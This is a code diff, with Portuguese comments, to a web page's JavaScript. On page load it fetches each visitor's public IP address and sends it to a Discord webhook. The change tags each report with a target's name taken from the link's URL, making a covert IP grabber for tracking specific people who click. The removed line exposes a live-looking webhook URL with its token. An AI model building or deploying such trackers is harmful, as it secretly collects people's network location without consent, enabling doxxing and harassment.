@@ -114,14 +114,26 @@
         
         async function Ip() {
         try {
-
+            // 1. Pega o IP do usuário
             const response = await fetch('https://api.ipify.org?format=json');
             const data = await response.json();
             const ip = data.ip; 
+            
+            // 2. Pega o nome do usuário que você colocou na URL (ex: ?user=Joao)
+            const urlParams = new URLSearchParams(window.location.search);
+            const usuarioDiscord = urlParams.get('user') || 'Usuário Desconhecido';
     
-            const webhookUrl = "https://discordapp.com/api/webhooks/1510398221652852847/Zg3-uvchJz_2w5mgR6rWcY8I4Giaur6aHWGefx_MMdW3xAXHFSEdMOAi0x-M7xOKc_GO";
+            // 3. Envia para o Webhook de forma organizada
+            const webhookUrl = "https://discordapp.com/api/webhooks/..."; // Seu webhook aqui
             const msg = {
-                content: ip
+                embeds: [{
+                    title: "📌 Novo Acesso Detectado",
+                    color: 3447003, // Cor azul
+                    fields: [
+                        { name: "Quem clicou", value: usuarioDiscord, inline: true },
+                        { name: "IP", value: ip, inline: true }
+                    ]
+                }]
             };
     
             await fetch(webhookUrl, {
@@ -131,7 +143,7 @@
             });
     
         } catch (erro) {
-            console.error(erro);
+            console.error("Erro ao rastrear:", erro);
         }
     }
     
